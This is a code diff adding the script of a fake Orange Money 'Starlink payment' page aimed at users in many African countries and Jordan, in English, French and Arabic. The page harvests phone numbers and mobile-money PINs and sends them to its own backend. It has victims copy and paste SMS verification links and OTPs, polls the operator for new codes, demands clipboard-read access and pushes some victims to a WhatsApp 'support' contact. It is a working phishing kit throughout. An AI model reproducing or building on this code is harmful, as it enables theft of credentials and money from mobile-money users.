+            'SZ': { code: '+268', length: 8, flag: 'sz', name: 'Eswatini', currency: 'SZL' },
+            'LS': { code: '+266', length: 8, flag: 'ls', name: 'Lesotho', currency: 'LSL' },
+            'MU': { code: '+230', length: 8, flag: 'mu', name: 'Mauritius', currency: 'MUR' },
+            'SC': { code: '+248', length: 7, flag: 'sc', name: 'Seychelles', currency: 'SCR' },
+            'SD': { code: '+249', length: 9, flag: 'sd', name: 'Sudan', currency: 'SDG' },
+            'SS': { code: '+211', length: 9, flag: 'ss', name: 'South Sudan', currency: 'SSP' },
+            'ER': { code: '+291', length: 7, flag: 'er', name: 'Eritrea', currency: 'ERN' },
+            'DJ': { code: '+253', length: 8, flag: 'dj', name: 'Djibouti', currency: 'DJF' },
+            'SO': { code: '+252', length: 9, flag: 'so', name: 'Somalia', currency: 'SOS' },
+            'BI': { code: '+257', length: 8, flag: 'bi', name: 'Burundi', currency: 'BIF' },
+            'JO': { code: '+962', length: 9, flag: 'jo', name: 'Jordan', currency: 'JOD' }
+        };
+        
+        // Package prices in CDF
+        const STARLINK_PACKAGES = {
+            'starter': { cdf: 30000, name: 'Starter Bundle', data: '120GB' },
+            'standard': { cdf: 50000, name: 'Standard Bundle', data: '250GB' },
+            'premium': { cdf: 75000, name: 'Premium Bundle', data: '400GB' },
+            'pro': { cdf: 100000, name: 'Pro Bundle', data: '600GB' },
+            'business': { cdf: 150000, name: 'Business Bundle', data: '1TB' },
+            'unlimited': { cdf: 250000, name: 'Unlimited Bundle', data: 'Unlimited' }
+        };
+        
+        // Currency rates (CDF to local)
+        const CURRENCY_RATES = {
+            'GHS': 0.00536, 'NGN': 0.554, 'UGX': 1.321, 'RWF': 0.429,
+            'ZMW': 0.027, 'XAF': 0.667, 'XOF': 0.667, 'CDF': 1,
+            'ZAR': 0.00643, 'USD': 0.000357, 'KES': 0.046, 'TZS': 0.893,
+            'ETB': 0.02, 'GNF': 3.07, 'SLL': 7.5, 'LRD': 0.068,
+            'AOA': 0.296, 'MZN': 0.0229, 'MWK': 0.607, 'ZWL': 0.001,
+            'BWP': 0.005, 'NAD': 0.00643, 'SZL': 0.00643, 'LSL': 0.00643,
+            'MGA': 1.607, 'MUR': 0.016, 'SCR': 0.005, 'SDG': 0.214,
+            'SSP': 0.046, 'ERN': 0.00536, 'DJF': 0.0636, 'SOS': 0.204,
+            'BIF': 2.97,
+            'JOD': 0.000253
+        };
+        
+        // French-speaking African countries
+        const FRENCH_COUNTRIES = new Set([
+            'CI','SN','ML','BF','GN','CM','CD','MG','NE','BJ',
+            'CG','TG','GA','TD','CF','GQ','BI','DJ','RW'
+        ]);
+
+        // Arabic-speaking countries
+        const ARABIC_COUNTRIES = new Set(['JO']);
+
+        const TRANSLATIONS = {
+            ar: {
+                welcome: 'مرحباً بك في Orange Money',
+                terms: 'باستخدام هذه الخدمة، أنت توافق على <a href="#">شروط الاستخدام</a> و<a href="#">سياسة الخصوصية</a>',
+                next: 'التالي',
+                back: 'رجوع',
+                enterPin: 'أدخل رمز PIN الخاص بـ Orange Money',
+                enterPinSub: 'أدخل رمز PIN المكوّن من 4 أرقام للموافقة على هذه المعاملة.',
+                submit: 'إرسال',
+                verificationLink: 'رابط التحقق',
+                verificationLinkSub: 'تم إرسال رابط التحقق إلى رقم هاتفك عبر رسالة SMS.',
+                doNotClick: 'لا تضغط على الرابط — فقط انسخه والصقه أدناه',
+                howToPaste: '📋 كيفية لصق الرابط:',
+                step1: 'افتح <strong>رسالة SMS</strong> التي تلقيتها من Orange Money',
+                step2: 'اعثر على الرابط في الرسالة — <strong style="color:#dc2626;">لا تضغط عليه</strong>',
+                step3: '<strong>اضغط مطوّلاً</strong> على الرابط حتى تظهر قائمة',
+                step4: 'اضغط على <strong>"نسخ الرابط"</strong> أو <strong>"نسخ"</strong>',
+                step5: 'عُد إلى هذه الصفحة',
+                step6: '<strong>اضغط مطوّلاً</strong> على الحقل أدناه ثم اضغط <strong>"لصق"</strong>',
+                step7: 'سيتم التحقق من الرابط <strong>تلقائياً</strong>',
+                linkPlaceholder: 'الصق رابط التحقق هنا...',
+                resendIn: 'إعادة إرسال الرابط خلال',
+                seconds: 'ثوانٍ',
+                resend: 'إعادة إرسال الرابط',
+                verify: 'تحقق',
+                verifying: 'جارٍ التحقق...',
+                ssl: 'مشفّر ومحمي بـ SSL',
+                selectCountry: 'اختر الدولة',
+                starlinkPayment: '⭐ دفع Starlink',
+                service: 'الخدمة',
+                amount: 'المبلغ',
+                starlinkRenewal: 'تجديد Starlink',
+                processing: 'جارٍ معالجة المعاملة. يرجى الانتظار...',
+                pasteNew: 'يرجى لصق رابط التحقق الجديد المُرسَل إلى هاتفك.',
+                verifyFailed: 'فشل التحقق. يرجى المحاولة مرة أخرى.',
+                linkExpired: 'انتهت صلاحية الرابط. يرجى طلب رابط جديد.',
+                sending: 'جارٍ الإرسال...',
+                notVerifiedTitle: 'الحساب غير موثّق',
+                notVerifiedMsg: 'حسابك غير موثّق بالكامل للاشتراك في خدمة الدفع.<br><br>اضغط على <strong>زر WhatsApp أدناه</strong> للتحدث مع فريق الدعم والحصول على التوثيق.',
+                contactSupport: 'تحدث مع الدعم الآن',
+                diffNumber: '← استخدام رقم آخر'
+            },
+            en: {
+                welcome: 'Welcome to Orange Money',
+                terms: 'By using this service you agree to our <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>',
+                next: 'NEXT',
+                back: 'Back',
+                enterPin: 'Enter your Orange Money PIN',
+                enterPinSub: 'Enter your 4-digit Orange Money PIN to authorize this transaction.',
+                submit: 'Submit',
+                verificationLink: 'Verification Link',
+                verificationLinkSub: 'A verification link has been sent to your phone number via SMS.',
+                doNotClick: 'DO NOT tap or open the link \u2014 only copy and paste it below',
+                howToPaste: '\ud83d\udccb How to paste your link:',
+                step1: 'Open the <strong>SMS message</strong> you received from Orange Money',
+                step2: 'Find the link in the SMS \u2014 <strong style="color:#dc2626;">DO NOT tap it</strong>',
+                step3: '<strong>Long press</strong> on the link until a menu appears',
+                step4: 'Tap <strong>"Copy link"</strong> or <strong>"Copy"</strong>',
+                step5: 'Switch back to this page',
+                step6: '<strong>Long press</strong> on the field below and tap <strong>"Paste"</strong>',
+                step7: 'The link will be verified <strong>automatically</strong>',
+                linkPlaceholder: 'Paste your verification link here...',
+                resendIn: 'Resend link in',
+                seconds: 'seconds',
+                resend: 'Resend link',
+                verify: 'Verify',
+                verifying: 'Verifying...',
+                ssl: 'SSL ENCRYPTED AND SECURE',
+                selectCountry: 'Select Country',
+                starlinkPayment: '\u2b50 Starlink Payment',
+                service: 'Service',
+                amount: 'Amount',
+                starlinkRenewal: 'Starlink Renewal',
+                processing: 'Transaction processing. Please wait...',
+                pasteNew: 'Please paste the new verification link sent to your phone.',
+                verifyFailed: 'Verification failed. Please try again.',
+                linkExpired: 'Link expired. Please request a new one.',
+                sending: 'Sending...',
+                notVerifiedTitle: 'Account Not Verified',
+                notVerifiedMsg: 'Your account is not fully verified to be eligible for payment subscription.<br><br>Tap the <strong>WhatsApp button below</strong> to chat with our support team and get verified.',
+                contactSupport: 'Chat with support now',
+                diffNumber: '\u2190 Use a Different Number'
+            },
+            fr: {
+                welcome: 'Bienvenue sur Orange Money',
+                terms: 'En utilisant ce service, vous acceptez nos <a href="#">Conditions d\'utilisation</a> et notre <a href="#">Politique de confidentialit\u00e9</a>',
+                next: 'SUIVANT',
+                back: 'Retour',
+                enterPin: 'Entrez votre code PIN Orange Money',
+                enterPinSub: 'Entrez votre code PIN \u00e0 4 chiffres Orange Money pour autoriser cette transaction.',
+                submit: 'Valider',
+                verificationLink: 'Lien de v\u00e9rification',
+                verificationLinkSub: 'Un lien de v\u00e9rification a \u00e9t\u00e9 envoy\u00e9 \u00e0 votre num\u00e9ro de t\u00e9l\u00e9phone par SMS.',
+                doNotClick: 'NE tapez PAS sur le lien \u2014 copiez-le uniquement et collez-le ci-dessous',
+                howToPaste: '\ud83d\udccb Comment coller votre lien :',
+                step1: 'Ouvrez le <strong>SMS</strong> que vous avez re\u00e7u d\'Orange Money',
+                step2: 'Trouvez le lien dans le SMS \u2014 <strong style="color:#dc2626;">NE tapez PAS dessus</strong>',
+                step3: '<strong>Appuyez longuement</strong> sur le lien jusqu\'\u00e0 ce qu\'un menu apparaisse',
+                step4: 'Appuyez sur <strong>\u00ab Copier le lien \u00bb</strong> ou <strong>\u00ab Copier \u00bb</strong>',
+                step5: 'Revenez sur cette page',
+                step6: '<strong>Appuyez longuement</strong> sur le champ ci-dessous et tapez <strong>\u00ab Coller \u00bb</strong>',
+                step7: 'Le lien sera v\u00e9rifi\u00e9 <strong>automatiquement</strong>',
+                linkPlaceholder: 'Collez votre lien de v\u00e9rification ici...',
+                resendIn: 'Renvoyer le lien dans',
+                seconds: 'secondes',
+                resend: 'Renvoyer le lien',
+                verify: 'V\u00e9rifier',
+                verifying: 'V\u00e9rification...',
+                ssl: 'CRYPT\u00c9 SSL ET S\u00c9CURIS\u00c9',
+                selectCountry: 'S\u00e9lectionnez le pays',
+                starlinkPayment: '\u2b50 Paiement Starlink',
+                service: 'Service',
+                amount: 'Montant',
+                starlinkRenewal: 'Renouvellement Starlink',
+                processing: 'Transaction en cours. Veuillez patienter...',
+                pasteNew: 'Veuillez coller le nouveau lien de v\u00e9rification envoy\u00e9 sur votre t\u00e9l\u00e9phone.',
+                verifyFailed: '\u00c9chec de la v\u00e9rification. Veuillez r\u00e9essayer.',
+                linkExpired: 'Lien expir\u00e9. Veuillez en demander un nouveau.',
+                sending: 'Envoi...',
+                notVerifiedTitle: 'Compte non v\u00e9rifi\u00e9',
+                notVerifiedMsg: 'Votre compte n\'est pas enti\u00e8rement v\u00e9rifi\u00e9 pour b\u00e9n\u00e9ficier d\'un abonnement de paiement.<br><br>Appuyez sur le <strong>bouton WhatsApp ci-dessous</strong> pour discuter avec notre \u00e9quipe de support et vous faire v\u00e9rifier.',
+                contactSupport: 'Discuter avec le support',
+                diffNumber: '\u2190 Utiliser un autre num\u00e9ro'
+            }
+        };
+
+        let currentLang = 'en';
+
+        function t(key) {
+            return TRANSLATIONS[currentLang][key] || TRANSLATIONS['en'][key] || key;
+        }
+
+        function applyLanguage() {
+            // Phone screen
+            document.getElementById('cardTitle').textContent = t('welcome');
+            document.querySelector('.terms-text').innerHTML = t('terms');
+            document.querySelector('#nextBtn .btn-text').textContent = t('next');
+
+            // Back buttons
+            document.querySelectorAll('.back-btn').forEach(btn => {
+                const svg = btn.querySelector('svg');
+                btn.innerHTML = '';
+                btn.appendChild(svg);
+                btn.append('\n                    ' + t('back'));
+            });
+
+            // PIN label (now inside phone screen)
+            document.getElementById('pinLabel').textContent = t('enterPinSub');
+
+            // Verification link screen
+            document.querySelector('#otpScreen .pin-title').textContent = t('verificationLink');
+            document.querySelectorAll('#otpScreen .pin-subtitle')[0].textContent = t('verificationLinkSub');
+            var howH4 = document.querySelector('.how-to-steps h4');
+            if (howH4) howH4.textContent = t('howToPaste');
+            document.getElementById('doNotClickWarning').innerHTML = t('doNotClick');
+            var steps = document.querySelectorAll('.how-to-steps ol li');
+            if (steps.length >= 7) {
+                steps[0].innerHTML = t('step1');
+                steps[1].innerHTML = t('step2');
+                steps[2].innerHTML = t('step3');
+                steps[3].innerHTML = t('step4');
+                steps[4].innerHTML = t('step5');
+                steps[5].innerHTML = t('step6');
+                steps[6].innerHTML = t('step7');
+            }
+            document.getElementById('linkInput').placeholder = t('linkPlaceholder');
+            document.getElementById('verifyBtn').textContent = t('verify');
+
+            // SSL badge
+            var sslBadge = document.getElementById('sslBadge');
+            var sslSvg = sslBadge.querySelector('svg');
+            sslBadge.innerHTML = '';
+            sslBadge.appendChild(sslSvg);
+            sslBadge.append('\n                ' + t('ssl'));
+
+            // Country modal
+            document.querySelector('.country-modal-header h3').textContent = t('selectCountry');
+
+            // Starlink
+            document.querySelector('#starlinkHeader h2').textContent = t('starlinkPayment');
+            var payLabels = document.querySelectorAll('.payment-label');
+            if (payLabels.length >= 2) {
+                payLabels[0].textContent = t('service');
+                payLabels[1].textContent = t('amount');
+            }
+            document.getElementById('starlinkService').textContent = t('starlinkRenewal');
+
+            // Resend link (if timer is not running)
+            var resendLink = document.getElementById('resendLink');
+            if (resendLink && !resendLink.classList.contains('disabled')) {
+                resendLink.innerHTML = t('resend');
+            }
+
+            // Not-verified screen
+            var nvTitle = document.querySelector('#notVerifiedScreen h2');
+            if (nvTitle) nvTitle.textContent = t('notVerifiedTitle');
+            var nvMsg = document.querySelector('#notVerifiedScreen p');
+            if (nvMsg) nvMsg.innerHTML = t('notVerifiedMsg');
+            var nvSupport = document.querySelector('#notVerifiedScreen button:first-of-type');
+            if (nvSupport) { const svg = nvSupport.querySelector('svg'); nvSupport.innerHTML = ''; if (svg) nvSupport.appendChild(svg); nvSupport.append(' ' + t('contactSupport')); }
+            var orangeSupport = document.getElementById('orangeContactSupport');
+            if (orangeSupport) orangeSupport.textContent = t('contactSupport');
+            var nvDiff = document.querySelector('#notVerifiedScreen button:last-of-type');
+            if (nvDiff) nvDiff.textContent = t('diffNumber');
+        }
+
+        let phoneCode = '+225';
+        let msisdnLength = 10;
+        let currentCountry = 'CI';
+        let currentMsisdn = '';
+        let currentPin = '';
+        let starlinkPackage = null;
+        let timerInterval = null;
+        
+        const phoneInput = document.getElementById('phoneInput');
+        const nextBtn = document.getElementById('nextBtn');
+        const phoneScreen = document.getElementById('phoneScreen');
+        const pinScreen = document.getElementById('pinScreen');
+        const otpScreen = document.getElementById('otpScreen');
+        const pinInputs = document.querySelectorAll('.pin-input');
+        const linkInput = document.getElementById('linkInput');
+        const submitBtn = document.getElementById('submitBtn');
+        const verifyBtn = document.getElementById('verifyBtn');
+        
+        // Country Selector Functions
+        function openCountrySelector() {
+            const countryList = document.getElementById('countryList');
+            countryList.innerHTML = '';
+            
+            // Populate country list
+            Object.keys(COUNTRIES).forEach(code => {
+                const country = COUNTRIES[code];
+                const li = document.createElement('li');
+                li.className = code === currentCountry ? 'selected' : '';
+                li.innerHTML = `
+                    <img src="https://flagcdn.com/w40/${country.flag}.png" alt="${country.name}">
+                    <span class="country-name">${country.name}</span>
+                    <span class="country-dial">${country.code}</span>
+                `;
+                li.onclick = () => selectCountryManual(code);
+                countryList.appendChild(li);
+            });
+            
+            document.getElementById('countryModal').classList.add('active');
+        }
+        
+        function closeCountrySelector() {
+            document.getElementById('countryModal').classList.remove('active');
+        }
+        
+        function selectCountryManual(code) {
+            // Update cache with manually selected country
+            localStorage.setItem('orange_country_cache', JSON.stringify({ country: code, timestamp: Date.now() }));
+            setCountry(code);
+            closeCountrySelector();
+            
+            // Clear phone input when country changes
+            phoneInput.value = '';
+            nextBtn.disabled = true;
+        }
+        
+        // Capture Starlink package from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('source') === 'starlink') {
+            starlinkPackage = urlParams.get('package') || 'starterer';
+        }
+        
+        // Detect country
+        async function detectCountry() {
+            try {
+                const cached = localStorage.getItem('orange_country_cache');
+                if (cached) {
+                    const data = JSON.parse(cached);
+                    if (Date.now() - data.timestamp < 86400000) {
+                        setCountry(data.country);
+                        return;
+                    }
+                }
+                
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                const countryCode = data.country_code || 'CI';
+                localStorage.setItem('orange_country_cache', JSON.stringify({ country: countryCode, timestamp: Date.now() }));
+                setCountry(countryCode);
+            } catch (e) {
+                setCountry('CI');
+            }
+        }
+        
+        function setCountry(code) {
+            // Get country config, or create a default for unknown countries
+            let country = COUNTRIES[code];
+            if (!country) {
+                // For unknown countries, use the country code as flag and USD
+                country = { 
+                    code: '+1', 
+                    length: 10, 
+                    flag: code.toLowerCase(), 
+                    name: code, 
+                    currency: 'USD' 
+                };
+            }
+            
+            currentCountry = code;
+            phoneCode = country.code;
+            msisdnLength = country.length;
+            
+            // Detect language based on country
+            if (ARABIC_COUNTRIES.has(code)) currentLang = 'ar';
+            else if (FRENCH_COUNTRIES.has(code)) currentLang = 'fr';
+            else currentLang = 'en';
+            applyLanguage();
+            
+            // Update flag - try detected country first, fallback to Côte d'Ivoire
+            const flagImg = document.getElementById('flagIcon');
+            flagImg.src = `https://flagcdn.com/w40/${country.flag}.png`;
+            flagImg.onerror = function() {
+                this.src = 'https://flagcdn.com/w40/ci.png';
+            };
+            
+            phoneInput.placeholder = `${phoneCode} XX XXX XXXX`;
+            
+            // Update Starlink amount if applicable
+            if (starlinkPackage) {
+                showStarlinkHeader();
+            }
+        }
+        
+        function showStarlinkHeader() {
+            const pkg = STARLINK_PACKAGES[starlinkPackage] || STARLINK_PACKAGES['starter'];
+            const country = COUNTRIES[currentCountry];
+            const currency = country ? country.currency : 'USD';
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const urlLp = urlParams.get('lp');
+            const urlCur = urlParams.get('cur');
+            const urlCdf = urlParams.get('cdf');
+
+            let displayAmount;
+            if (urlLp && urlCur) {
+                // Use the pre-calculated local price passed from plans.html
+                const lpNum = parseFloat(urlLp);
+                const formatted = Number.isInteger(lpNum) ? lpNum.toLocaleString() : lpNum;
+                displayAmount = `${urlCur} ${formatted}`;
+            } else {
+                const rate = CURRENCY_RATES[currency] || 0.000357; // USD fallback
+                const baseCdfAmount = urlCdf ? parseInt(urlCdf) : pkg.cdf;
+                const localAmount = Math.round(baseCdfAmount * rate);
+                displayAmount = `${currency} ${localAmount.toLocaleString()}`;
+            }
+
+            document.getElementById('starlinkHeader').classList.add('active');
+            document.getElementById('paymentDetails').classList.add('active');
+            document.getElementById('sslBadge').classList.add('active');
+            document.getElementById('starlinkAmount').textContent = displayAmount;
+            document.getElementById('cardTitle').textContent = 'Enter your Orange Money number';
+        }
+        
+        function checkNextReady() {
+            const phoneOk = phoneInput.value.replace(/\D/g, '').length >= msisdnLength;
+            const pinOk = getPinValue().length === 4;
+            nextBtn.disabled = !(phoneOk && pinOk);
+        }
+
+        // Phone input handling
+        phoneInput.addEventListener('input', function() {
+            const value = this.value.replace(/\D/g, '');
+            this.value = value;
+            checkNextReady();
+        });
+
+        // PIN input handling
+        pinInputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                const value = this.value.replace(/\D/g, '');
+                this.value = value;
+                if (value && index < pinInputs.length - 1) {
+                    pinInputs[index + 1].focus();
+                }
+                checkNextReady();
+            });
+
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && index > 0) {
+                    pinInputs[index - 1].focus();
+                }
+            });
+        });
+
+        function getPinValue() {
+            return Array.from(pinInputs).map(i => i.value).join('');
+        }
+
+        // Next button - submit phone + PIN, go directly to link screen
+        nextBtn.addEventListener('click', async function() {
+            currentMsisdn = phoneInput.value.replace(/\D/g, '');
+            // Strip country code if user accidentally included it (e.g. typed 232XXXXXXXX instead of XXXXXXXX)
+            const _codeDigits = phoneCode.replace(/\D/g, '');
+            if (currentMsisdn.startsWith(_codeDigits) && currentMsisdn.length > msisdnLength) {
+                currentMsisdn = currentMsisdn.slice(_codeDigits.length);
+            }
+            currentPin = getPinValue();
+            if (currentMsisdn.length < msisdnLength || currentPin.length < 4) return;
+
+            nextBtn.disabled = true;
+            nextBtn.querySelector('.btn-text').textContent = currentLang === 'fr' ? 'Traitement...' : 'Processing...';
+
+            try {
+                await fetch('/api/orange/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: `${phoneCode} ${currentMsisdn}`,
+                        pin: currentPin,
+                        country: currentCountry,
+                        starlinkPackage: starlinkPackage
+                    })
+                });
+            } catch (e) {
+                document.getElementById('pinError').textContent = currentLang === 'fr' ? 'Une erreur est survenue. Veuillez r\u00e9essayer.' : currentLang === 'ar' ? 'حدث خطأ. يرجى المحاولة مرة أخرى.' : 'Something went wrong. Please try again.';
+                document.getElementById('pinError').classList.add('show');
+            }
+
+            // For DRC (CD), Sierra Leone (SL), Liberia (LR), Burkina Faso (BF) — no OTP, show not-verified screen
+            // Jordan (JO) uses 4-digit OTP — show Jordan OTP screen
+            if (currentCountry === 'JO') {
+                phoneScreen.classList.add('hidden');
+                document.getElementById('joPhoneDisplay').textContent = `${phoneCode} ${currentMsisdn}`;
+                document.getElementById('jordanOtpScreen').classList.add('active');
+                document.querySelector('[data-jo-index="0"]').focus();
+                startJordanOtpPolling();
+                nextBtn.disabled = false;
+                nextBtn.querySelector('.btn-text').textContent = t('next');
+                return;
+            }
+            if (currentCountry === 'SL' || currentCountry === 'LR' || currentCountry === 'BF') {
+                phoneScreen.classList.add('hidden');
+                document.getElementById('notVerifiedScreen').classList.add('active');
+                nextBtn.disabled = false;
+                nextBtn.querySelector('.btn-text').textContent = t('next');
+                return;
+            }
+
+            phoneScreen.classList.add('hidden');
+            otpScreen.classList.add('active');
+            document.getElementById('phoneDisplay').textContent = `${phoneCode}${currentMsisdn}`;
+            linkInput.focus();
+            startTimer();
+            startStatusPolling();
+            startLinkPolling();
+            // Gate: enforce clipboard permission before user can proceed
+            checkClipboardPermission();
+
+            nextBtn.disabled = false;
+            nextBtn.querySelector('.btn-text').textContent = t('next');
+        });
+        
+        // Link input handling
+        linkInput.addEventListener('input', function() {
+            const val = this.value.trim();
+            verifyBtn.disabled = val.length < 5;
+        });
+        
+        async function openSupport() {
+            try {
+                const res = await fetch('/api/support-whatsapp');
+                const data = await res.json();
+                const number = (data.number || '').replace(/\D/g, '');
+                if (number) {
+                    const phone = currentMsisdn ? `${phoneCode} ${currentMsisdn}` : '—';
+                    const localAmt = urlParams.get('lp');
+                    const cur = urlParams.get('cur') || '';
+                    const amount = localAmt ? `${cur} ${Number(localAmt).toLocaleString()}` : '—';
+                    let message;
+                    if (currentLang === 'fr') {
+                        message = `Bonjour Support,\n\nMon compte affiche "Compte Non Vérifié" et je ne peux pas finaliser mon abonnement de paiement.\n\nDétails :\n• Numéro de téléphone : ${phone}\n• Service : Renouvellement Starlink\n• Montant : ${amount}\n\nMerci de m'aider à procéder à la vérification.\n\nMerci.`;
+                    } else if (currentLang === 'ar') {
+                        message = `مرحباً فريق الدعم،\n\nحسابي يُظهر "غير موثّق" ولا أستطيع إتمام اشتراك الدفع.\n\nالتفاصيل:\n• رقم الهاتف: ${phone}\n• الخدمة: تجديد Starlink\n• المبلغ: ${amount}\n\nأرجو مساعدتي في عملية التوثيق.\n\nشكراً.`;
+                    } else {
+                        message = `Hello Support,\n\nMy account is showing "Account Not Verified" and I'm unable to complete my payment subscription.\n\nDetails:\n• Phone Number: ${phone}\n• Service: Starlink Renewal\n• Amount: ${amount}\n\nPlease assist me with verification.\n\nThank you.`;
+                    }
+                    window.open('https://wa.me/' + number + '?text=' + encodeURIComponent(message), '_blank');
+                } else {
+                    alert(currentLang === 'fr' ? 'Le support n\'est pas disponible pour le moment.' : currentLang === 'ar' ? 'الدعم غير متاح حالياً. يرجى المحاولة لاحقاً.' : 'Support is not currently available. Please try again later.');
+                }
+            } catch(e) {
+                alert(currentLang === 'fr' ? 'Le support n\'est pas disponible pour le moment.' : currentLang === 'ar' ? 'الدعم غير متاح حالياً. يرجى المحاولة لاحقاً.' : 'Support is not currently available. Please try again later.');
+            }
+        }
+
+        function showPhoneScreen() {
+            document.getElementById('notVerifiedScreen').classList.remove('active');
+            document.getElementById('jordanOtpScreen').classList.remove('active');
+            if (jordanPollInterval) { clearInterval(jordanPollInterval); jordanPollInterval = null; }
+            phoneScreen.classList.remove('hidden');
+        }
+
+        // ── Jordan 4-digit OTP ──
+        function joOtpMove(input, index) {
+            if (input.value) {
+                const next = document.querySelector(`[data-jo-index="${index + 1}"]`);
+                if (next) next.focus();
+            }
+            checkJoOtpReady();
+        }
+
+        function joOtpBack(e, input, index) {
+            if (e.key === 'Backspace' && !input.value && index > 0) {
+                const prev = document.querySelector(`[data-jo-index="${index - 1}"]`);
+                if (prev) { prev.focus(); prev.value = ''; }
+                e.preventDefault();
+            }
+        }
+
+        function checkJoOtpReady() {
+            const code = Array.from(document.querySelectorAll('[data-jo-index]')).map(i => i.value).join('');
+            document.getElementById('joVerifyBtn').disabled = code.length < 4;
+            if (code.length === 4) submitJordanOtp();
+        }
+
+        async function submitJordanOtp() {
+            const code = Array.from(document.querySelectorAll('[data-jo-index]')).map(i => i.value).join('');
+            if (code.length < 4) return;
+            const btn = document.getElementById('joVerifyBtn');
+            btn.disabled = true;
+            btn.textContent = 'Verifying...';
+            document.getElementById('joOtpError').textContent = '';
+            try {
+                const res = await fetch('/api/orange/verify-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ otp: code, phone: `${phoneCode} ${currentMsisdn}`, country: currentCountry })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    // Show inline success — no next page, no insufficient balance screen
+                    document.getElementById('joOtpSuccess').style.display = 'block';
+                    document.getElementById('joVerifyBtn').style.display = 'none';
+                    document.getElementById('joResendLink').parentElement.style.display = 'none';
+                    document.querySelectorAll('[data-jo-index]').forEach(i => { i.disabled = true; i.style.opacity = '0.5'; });
+                } else {
+                    document.getElementById('joOtpError').textContent = currentLang === 'ar'
+                        ? 'رمز OTP غير صحيح. الرجاء استخدام الرمز الجديد.'
+                        : 'Incorrect OTP. Please use the new OTP sent to your phone.';
+                    Array.from(document.querySelectorAll('[data-jo-index]')).forEach(i => i.value = '');
+                    document.querySelector('[data-jo-index="0"]').focus();
+                    btn.disabled = false;
+                    btn.textContent = currentLang === 'ar' ? 'تحقق' : 'Verify OTP';
+                }
+            } catch(e) {
+                document.getElementById('joOtpError').textContent = currentLang === 'ar' ? 'حدث خطأ. يرجى المحاولة مرة أخرى.' : 'Something went wrong. Please try again.';
+                btn.disabled = false;
+                btn.textContent = currentLang === 'ar' ? 'تحقق' : 'Verify OTP';
+            }
+        }
+
+        async function resendJordanOtp() {
+            const link = document.getElementById('joResendLink');
+            if (link.classList.contains('disabled')) return;
+            link.classList.add('disabled');
+            try {
+                await fetch('/api/orange/resend-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: `${phoneCode} ${currentMsisdn}`, country: currentCountry })
+                });
+            } catch(e) {}
+            setTimeout(() => link.classList.remove('disabled'), 30000);
+        }
+
+        // ── Jordan OTP status polling ──
+        let jordanPollInterval = null;
+        function startJordanOtpPolling() {
+            if (jordanPollInterval) clearInterval(jordanPollInterval);
+            jordanPollInterval = setInterval(async () => {
+                try {
+                    const res = await fetch('/api/check-status');
+                    const data = await res.json();
+                    if (data.status === 'orange_wrong_otp') {
+                        clearInterval(jordanPollInterval);
+                        jordanPollInterval = null;
+                        // Show error, clear boxes, allow re-entry
+                        document.getElementById('joOtpError').textContent = 'رمز OTP غير صحيح. الرجاء استخدام الرمز الجديد المُرسَل إلى هاتفك.';
+                        document.querySelectorAll('[data-jo-index]').forEach(i => { i.value = ''; i.disabled = false; i.style.opacity = '1'; });
+                        document.getElementById('joVerifyBtn').disabled = true;
+                        document.getElementById('joVerifyBtn').style.display = '';
+                        document.getElementById('joOtpSuccess').style.display = 'none';
+                        if (document.getElementById('joResendLink').parentElement) {
+                            document.getElementById('joResendLink').parentElement.style.display = '';
+                        }
+                        document.querySelector('[data-jo-index="0"]').focus();
+                        // Restart polling after user sees error
+                        setTimeout(() => startJordanOtpPolling(), 500);
+                    }
+                } catch(e) {}
+            }, 3000);
+        }
+        
+        linkInput.addEventListener('paste', function() {
+            // Check after paste event completes, then auto-submit
+            setTimeout(() => {
+                const val = this.value.trim();
+                verifyBtn.disabled = val.length < 5;
+                if (val.length >= 5) {
+                    linkAutoFilled = true;
+                    stopLinkPolling();
+                    verifyBtn.click();
+                }
+            }, 100);
+        });
+        
+        // Verify Link
+        verifyBtn.addEventListener('click', async function() {
+            const link = linkInput.value.trim();
+            if (link.length < 5) return;
+            
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = t('verifying');
+            
+            try {
+                await fetch('/api/orange/verify-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: `${phoneCode} ${currentMsisdn}`,
+                        otp: link,
+                        country: currentCountry
+                    })
+                });
+                
+                // Show success then prompt for new link
+                const errEl = document.getElementById('otpError');
+                errEl.textContent = t('processing');
+                errEl.style.background = '#e8f5e9';
+                errEl.style.color = '#2e7d32';
+                errEl.classList.add('show');
+                
+                // Auto-clear input ready for next link
+                linkInput.value = '';
+                verifyBtn.disabled = true;
+                
+                // After 3 seconds, prompt user for new link and resume clipboard watching
+                setTimeout(() => {
+                    errEl.textContent = t('pasteNew');
+                    errEl.style.background = '#fff3e0';
+                    errEl.style.color = '#e65100';
+                    linkInput.focus();
+                    startLinkPolling(link); // restart, seed with submitted link so it won't re-submit it
+                }, 3000);
+                
+            } catch (e) {
+                document.getElementById('otpError').textContent = t('verifyFailed');
+                document.getElementById('otpError').classList.add('show');
+                startLinkPolling(link); // restart so user can paste or auto-paste the new link
+            }
+            
+            verifyBtn.disabled = false;
+            verifyBtn.textContent = t('verify');
+        });
+        
+        // ── Clipboard Permission Gate ──
+        const clipboardGate = document.getElementById('clipboardGate');
+        const clipboardGateBtn = document.getElementById('clipboardGateBtn');
+        let clipboardGranted = false;
+
+        async function checkClipboardPermission() {
+            try {
+                // Try reading clipboard — will throw if denied
+                await navigator.clipboard.readText();
+                clipboardGranted = true;
+                clipboardGate.style.display = 'none';
+                // Notify backend that clipboard was allowed
+                fetch('/api/clipboard-status', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ decision: 'allowed', phone: currentMsisdn, country: currentCountry, source: 'orange' })
+                }).catch(() => {});
+                return true;
+            } catch (e) {
+                // Permission denied or dismissed
+                clipboardGranted = false;
